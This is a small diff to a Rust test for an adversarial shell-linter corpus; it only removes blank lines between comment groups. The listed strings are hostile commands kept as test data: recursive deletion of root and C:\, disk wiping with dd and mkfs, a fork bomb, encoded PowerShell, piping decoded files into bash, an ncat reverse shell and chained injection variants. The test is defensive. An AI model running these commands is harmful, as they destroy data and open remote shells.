@@ -14,7 +14,6 @@ fn test_adversarial_shell_linter_corpus() {
         "rd /s /q C:\\Windows",
         "rd /s C:\\",
         "del /f /s /q C:\\*",
-
         // 11-20: Obfuscated & encoded execution
         "powershell -EncodedCommand JABhACAAPQAgACIAMQAiAA==",
         "pwsh -e JABhACAAPQAgACIAMQAiAA==",
@@ -26,7 +25,6 @@ fn test_adversarial_shell_linter_corpus() {
         "base64 -d evil.txt | bash",
         "python -c 'import os; os.system(\"rm -rf /\")'",
         "python3 -c 'import shutil; shutil.rmtree(\"/\")'",
-
         // 21-30: Destructive system tools
         "perl -e 'unlink glob(\"*\")'",
         "find / -delete",
@@ -38,7 +36,6 @@ fn test_adversarial_shell_linter_corpus() {
         "chmod 000 /",
         "format C: /FS:NTFS",
         "diskpart /s script.txt",
-
         // 31-40: Low-level / destructive hardware commands
         "cipher /w:C:\\",
         ":(){ :|:& };:",
@@ -50,7 +47,6 @@ fn test_adversarial_shell_linter_corpus() {
         "dd if=/dev/zero of=/dev/sda bs=1M",
         "mkfs.ext4 /dev/sda1",
         "fdisk /dev/sda",
-
         // 41-50: Tokenizer bypass & unallowlisted binaries
         "sudo rm -rf /",
         "su -c 'rm -rf /'",
@@ -62,7 +58,6 @@ fn test_adversarial_shell_linter_corpus() {
         "ncat -e /bin/sh 10.0.0.1 8080",
         "telnet 10.0.0.1 80",
         "ftp -n 10.0.0.1",
-
         // 51-55: Chained & multi-spaced variants
         "git status ; rm -rf /",
         "echo safe && rd /s C:\\",
